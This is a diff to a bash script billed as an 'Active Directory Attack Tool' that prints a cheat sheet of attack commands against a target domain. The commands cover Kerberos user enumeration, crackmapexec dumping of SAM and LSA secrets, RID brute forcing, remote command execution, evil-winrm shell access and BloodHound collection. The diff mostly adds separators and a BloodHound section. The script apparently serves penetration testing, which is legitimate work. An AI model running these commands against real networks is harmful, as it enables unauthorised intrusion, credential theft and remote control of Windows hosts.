@@ -13,6 +13,7 @@ Password="";
 Domain="";
 IP="";
 LDAP="";
+NS="IP";
 
 # Wordlists
 UserList="/usr/share/seclists/Usernames/Names/names.txt"
@@ -132,7 +133,7 @@ echo 'CSAgICBfICAgIF9fX18gICAgXyAgX19fX18gCgkgICAvIFwgIHwgIF8gXCAgLyBcfF8gICBffA
 echo -e ""
 echo -e ""
 echo -e "	${LGREEN}Active Directory Attack Tool v0.1${RESTORE}"
-echo -e  "	${GREEN}Author:	ViperOne${RESTORE}"
+echo -e  "	${LGREEN}Author:	ViperOne${RESTORE}"
 
 echo -e ""
 echo -e ""
@@ -152,18 +153,26 @@ echo -e ""
 # Main                                                                     #
 ################################################################################
 
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
+
+
 # DNS
 echo -e "${LGREEN}DNS${RESTORE}"
 echo -e ""
 echo -e "nmap --script dns-brute --script-args dns-brute.threads=12 '$Domain'"
 echo -e "dnsenum --dnsserver $IP --enum '$Domain'"
 echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
 
 # Kerberos
-echo -e "${LGREEN}אKerberosא${RESTORE}"
+echo -e "${LGREEN}Kerberos${RESTORE}"
 echo -e ""
 echo -e "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='$Domain',userdb='$UserList' '$IP'"
 echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers; set rhost $IP; set lport 4444; set DOMAIN $Domain; set USER_FILE $UserList; exploit'"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 
 # NTP
@@ -171,6 +180,8 @@ echo -e "${LGREEN}NTP${RESTORE}"
 echo -e ""
 echo -e "sudo ntpdate '$IP'"
 echo -e "sudo nmap -sU -p 123 --script ntp-info '$IP'"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 
 # SMB
@@ -184,7 +195,7 @@ echo -e "smbmap -H '$IP' -u '$Username' -p '$Password'"
 echo -e ""
 echo -e "smbclient -U '' -P '' -L '$IP'"
 echo -e ""
-echo -e "crackmapexec smb '$IP' -u '$Username' -p '$Password'"
+echo -e "crackmapexec smb $IP -u '$Username' -p '$Password'"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --rid-brute"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --lsa"
 echo -e "crackmapexec smb $IP -u $Username -p $Password --sam"
@@ -199,6 +210,8 @@ echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users --sessi
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
 echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
 
 # LDAP
 echo -e "${LGREEN}LDAP${RESTORE}"
@@ -207,12 +220,23 @@ echo -e "nmap -n -sV --script "ldap* and not brute" $IP"
 echo -e "ldapsearch -x -h '$IP' -D '' -w '' -b "$LDAP" | grep userPrincipalName"
 echo -e "ldapsearch -x -h $IP -D '' -w '' -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
 echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
 
-#WinRM
+# WinRM
 echo -e "${LGREEN}WinRM${RESTORE}"
 echo -e ""
 echo -e "crackmapexec winrm $IP -u $Username -p $Password"
 echo -e "evil-winrm -i $IP -u $Username -p $Password"
 echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
 
-
+# BloodHound
+echo -e "${LRED}BloodHound${RESTORE}"
+echo -e "${RED}https://github.com/fox-it/BloodHound.py${RESTORE}"
+echo -e ""
+echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
+echo -e ""
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e ""
